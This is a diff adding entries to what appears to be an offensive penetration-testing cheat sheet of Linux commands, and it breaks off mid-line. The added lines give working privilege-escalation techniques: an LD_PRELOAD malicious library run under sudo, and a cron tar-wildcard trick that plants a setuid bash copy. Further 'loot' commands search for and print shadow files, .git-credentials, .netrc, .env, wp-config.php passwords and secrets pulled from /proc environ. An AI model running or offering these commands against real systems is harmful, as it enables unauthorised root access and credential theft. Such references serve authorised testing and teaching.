@@ -37,5 +37,27 @@ Port Usage Check (Linux):sudo lsof -i :<port> #identify process using specific T
 Local Privilege Escalation (User / Root Switch):su - <user> #switch to specified user account with full login shell; target-machine
 Local Privilege Escalation (User / Root Switch):sudo su root #switch to root user using sudo privileges; target-machine
 Local Privilege Escalation (User / Root Switch):sudo su - #switch to root with login shell environment; target-machine
+LD_PRELOAD Check:sudo -l | grep -i "env_keep.*LD_PRELOAD" # check if LD_PRELOAD preserved in sudo; target-machine
+LD_PRELOAD Exploit:# Create malicious library: gcc -shared -fPIC -o /tmp/lib.so shell.c -nostartfiles; target-machine
+LD_PRELOAD Execution:sudo LD_PRELOAD=/tmp/lib.so <sudo_allowed_command> # execute with root privileges; target-machine
+Kernel Modules (list loaded):lsmod # list loaded kernel modules; target-machine
+Kernel Modules (module info):modinfo <module_name> # get info about kernel module; target-machine
+Kernel Modules (alternative):cat /proc/modules # alternative module listing; target-machine
+Cron Wildcard Abuse (create malicious script):echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /tmp/run.sh; chmod +x /tmp/run.sh # create malicious script; target-machine
+Cron Wildcard Abuse (checkpoint files):touch /tmp/--checkpoint=1; touch /tmp/--checkpoint-action=exec=sh\ run.sh # create tar checkpoint files for wildcard abuse; target-machine
+Systemd Timers (list):systemctl list-timers --all # list all systemd timers; target-machine
+Systemd Timers (writable units):find /etc/systemd/system -writable -type f 2>/dev/null # find writable systemd unit files; target-machine
+Systemd Timers (writable units system):find /usr/lib/systemd/system -writable -type f 2>/dev/null # find writable systemd unit files; target-machine
+PAM Configuration (nullok check):cat /etc/pam.d/* | grep -v "^#" | grep -i "nullok" # find nullok pam config (allows empty passwords); target-machine
+PAM Configuration (writable):find /etc/pam.d -writable -type f 2>/dev/null # find writable PAM configs; target-machine
+loot:find / -name shadow -readable 2>/dev/null -exec ls -la {} \; # find all readable shadow files; target-machine
+loot:find /home -name ".netrc" -exec cat {} \; 2>/dev/null # find all .netrc files (FTP/curl auto-login); target-machine
+loot:find / -name ".git-credentials" 2>/dev/null -exec cat {} \; # find all .git-credentials files; target-machine
+loot:find / -name ".env" -o -name "env" -o -name "*.env.*" 2>/dev/null # find all .env files (environment variables often contain secrets); target-machine
+loot:find / -name "composer.json" -exec grep -i "password\|pass\|db\|pwd" {} \; 2>/dev/null # find all composer.json files (PHP - may contain DB creds); target-machine
+loot:find / -name "wp-config.php" -exec grep -i "DB_USER\|DB_PASSWORD" {} \; 2>/dev/null # find all wp-config.php (WordPress config with DB creds); target-machine
+loot:find / -name "config.php" -o -name "configuration.php" -exec grep -i "password\|pass\|user" {} \; 2>/dev/null # find all config.php files; target-machine
+loot:cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i "key\|token\|secret\|password" | sort -u # extract environment variables from /proc; target-machine
+loot:find /home -name "*.gpg" -o -name "
 
 
